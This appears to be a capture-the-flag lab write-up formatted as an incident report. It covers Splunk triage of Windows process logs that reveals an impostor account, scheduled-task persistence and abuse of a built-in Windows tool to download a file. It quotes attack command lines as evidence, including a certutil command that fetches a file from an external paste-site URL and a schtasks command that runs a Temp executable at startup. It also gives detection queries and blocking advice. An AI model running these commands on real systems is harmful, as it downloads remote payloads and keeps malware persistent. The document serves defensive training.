# Incident Report: Benign – SIEM Log Triage & LOLBin Payload Staging

| Metadata | Details |
| :--- | :--- |
| **Date** | October 2026 |
| **Analyst** | Piotr Asyngier |
| **SIEM / Tools Used** | Splunk Enterprise |
| **Category** | SIEM Triage, Persistence & LOLBin Execution |
| **Affected Environment** | Domain: `cybertees.local` (Hosts: `HR_01`, `HR_02`) |

---

## 1. Executive Summary
Intrusion Detection System (IDS) alerts indicated anomalous process creation events originating from the HR department subnet within the `cybertees.local` domain. A retrospective investigation of Windows Event Logs (`EventID 4688`) ingested into **Splunk** from March 2022 was conducted to scope the compromise.

The investigation uncovered three distinct malicious activities:
1. Creation/presence of a typosquatted impostor account (`Amel1a`) mimicking a legitimate Marketing employee (`Amelia`).
2. Unauthorized persistence established on host `HR_02` under user `Chris.Fort` via a scheduled task (`OfficeUpdater`) executing a payload from a temporary directory.
3. Abuse of a native Windows binary (`certutil.exe` – LOLBin) by HR user `Haroon` on host `HR_01` to download a malicious executable (`benign.exe`) from an external paste/file-sharing service (`controlc[.]com`).

---

## 2. SIEM Investigation & Technical Analysis

### 2.1. Log Ingestion Scope & Baseline (March 2022)
To establish visibility across the environment, the primary Windows event log index was queried across the `All Time` window:
* **SPL Query:** `index=win_eventlogs`
* **Telemetry Volume:** A total of **13,959 events** were ingested during the incident timeframe (March 2022), primarily consisting of Windows Security Auditing process creation logs (`EventID 4688`).

<img width="1856" height="321" alt="obraz" src="https://github.com/user-attachments/assets/93711ce7-9b15-48cc-88eb-99499cad4090" />


---

### 2.2. Identification of Typosquatted Impostor Account (`Amel1a`)
The organization's employee directory consists of 9 legitimate users across three departments:
* **IT Department:** `James`, `Moin`, `Katrina`
* **HR Department:** `Haroon`, `Chris` (`Chris.Fort`), `Diana` (`Daina`)
* **Marketing Department:** `Bell`, `Amelia`, `Deepak`

**Step 1 – Initial Aggregation Pitfall:**
Running a standard timechart query (`index=win_eventlogs | timechart count by UserName limit=10`) grouped low-frequency accounts into the `OTHER` bucket due to Splunk's default 10-series display limit, masking low-noise anomalies.

<img width="1850" height="716" alt="obraz" src="https://github.com/user-attachments/assets/6fb216aa-4c76-448f-af7a-a1b1a7943d44" />


**Step 2 – Full Account Enumeration:**
Expanding the aggregation limit exposed all distinct usernames active in the logs:
* **SPL Query:** `index=win_eventlogs UserName="*" | top limit=20 UserName`
* **Findings:** An anomalous account named **`Amel1a`** (using the digit `1` instead of the letter `i` to impersonate `Amelia`) was identified at the bottom of the distribution with only **1 recorded event**.

<img width="1844" height="464" alt="obraz" src="https://github.com/user-attachments/assets/924a880a-92ea-44ca-bed0-9460fdb07bdd" />


---

### 2.3. Unauthorized Persistence via Scheduled Tasks (`schtasks.exe`)
To detect persistence mechanisms, process creation logs (`EventID 4688`) were filtered for invocations of the Windows Task Scheduler binary (`schtasks.exe`).

* **Initial Triage:** While IT administrators (`James`, `Moin`, `Katrina`) frequently executed `schtasks.exe` as part of routine maintenance, a single anomalous execution was attributed to an HR department account: **`Chris.Fort`**.
* **Targeted SPL Query:** `index=win_eventlogs EventID=4688 schtasks.exe UserName="Chris.Fort"`
* **Findings:** On **`2022-03-04T14:33:40Z`**, user `Chris.Fort` on host **`HR_02`** (`ProcessID: 7096`) executed the following command to register a persistent startup payload:
  * **ProcessName:** `C:\Windows\System32\schtasks.exe`
  * **CommandLine:** `"/create /tn OfficeUpdater /tr "C:\Users\Chris.Fort\AppData\Local\Temp\update.exe" /sc onstart"`

<img width="1853" height="961" alt="obraz" src="https://github.com/user-attachments/assets/c823d34b-299c-4df0-bf87-343ca3bd6dac" />


<img width="1853" height="961" alt="obraz" src="https://github.com/user-attachments/assets/e7d014a7-0ce4-4007-8872-0ab8a0778356" />


---

### 2.4. LOLBin Abuse & External Payload Staging (`certutil.exe`)
Further investigation focused on HR department users (`Chris.Fort`, `Haroon`, `Daina`) executing Living Off the Land Binaries (LOLBins) capable of fetching remote payloads while bypassing standard application whitelisting.

* **Targeted SPL Query:**
  `index=win_eventlogs EventID=4688 (UserName=Chris.Fort OR UserName=Haroon OR UserName=Daina) (certutil.exe OR rundll32.exe OR bitsadmin.exe OR powershell.exe)`
* **Tabular Extraction Query:**
  `index=win_eventlogs EventID=4688 benign.exe | table CommandLine EventTime`

**Key Findings from Telemetry:**
* **Timestamp:** `2022-03-04T10:36:28Z`
* **Compromised Host & Account:** Host **`HR_01`**, user **`Haroon`** (`cybertees.local`)
* **Abused System Binary (LOLBin):** `C:\Windows\System32\certutil.exe` (`ProcessID: 4672`)
* **Executed Command Line:** `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe`
* **Staging Analysis:** The attacker abused `certutil.exe` with the `-urlcache -f` arguments to force an HTTP GET request to the third-party paste site **`controlc[.]com`** (`hxxps://controlc[.]com/e4d11035`) and saved the resulting payload locally as **`benign.exe`** (`THM{REDACTED_FLAG}`).

<img width="1853" height="961" alt="obraz" src="https://github.com/user-attachments/assets/c82864c8-84e7-4676-ab43-c54b2e565f33" />


<img width="1853" height="961" alt="obraz" src="https://github.com/user-attachments/assets/96d8252a-4fba-47b2-abeb-65bfb8ade2d7" />


---

## 3. Attack Timeline (March 4, 2022)

| Timestamp (UTC) | Host | User Account | EventID / Process | Activity Description |
| :--- | :--- | :--- | :--- | :--- |
| `2022-03-04 10:36:28` | `HR_01` | `Haroon` | `4688` (`certutil.exe`) | Downloaded remote payload from `hxxps://controlc[.]com/e4d11035` and saved as `benign.exe`. |
| `2022-03-04 14:33:40` | `HR_02` | `Chris.Fort` | `4688` (`schtasks.exe`) | Created scheduled task `OfficeUpdater` to execute `C:\Users\Chris.Fort\AppData\Local\Temp\update.exe` on startup. |

---

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value (Defanged) | Context |
| :--- | :--- | :--- |
| **Account** | `Amel1a` | Typosquatted impostor account in `cybertees.local` |
| **URL** | `hxxps://controlc[.]com/e4d11035` | External staging URL hosting the payload |
| **Domain** | `controlc[.]com` | Third-party file/text sharing service abused for C2 staging |
| **File Artifact** | `benign.exe` | Payload downloaded via `certutil.exe` on `HR_01` |
| **File Path** | `C:\Users\Chris.Fort\AppData\Local\Temp\update.exe` | Malicious binary persisted via Scheduled Task on `HR_02` |
| **Scheduled Task** | `OfficeUpdater` | Malicious persistence task configured with `/sc onstart` |

---

## 5. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques
* **`T1036.005` – Masquerading: Match Legitimate Name or Location:** Creation of the `Amel1a` user account to blend in with the legitimate user `Amelia`, alongside naming tasks `OfficeUpdater`.
* **`T1105` – Ingress Tool Transfer:** Using `certutil.exe -urlcache -f` to download `benign.exe` from an external web service (`controlc[.]com`).
* **`T1053.005` – Scheduled Task/Job: Scheduled Task:** Establishing system-level persistence (`onstart`) using `schtasks.exe /create` on `HR_02`.

### Recommended Remediation Actions
1. **Identity & Access Management:** Immediately disable the rogue account `Amel1a` in Active Directory and force a password reset + session revocation for compromised HR users `Haroon` and `Chris.Fort`.
2. **Host Isolation & Eradication:** Isolate endpoints `HR_01` and `HR_02`. Remove the scheduled task `OfficeUpdater` (`schtasks /delete /tn OfficeUpdater /f`) and quarantine both `C:\Users\Chris.Fort\AppData\Local\Temp\update.exe` and `benign.exe`.
3. **Detection Engineering & Hardening:** Implement SIEM alert rules for non-administrative users executing `schtasks.exe` and monitor/block `certutil.exe` initiating outbound network connections (`-urlcache`, `-verifyctl`). Block `controlc.com` on the corporate web proxy.
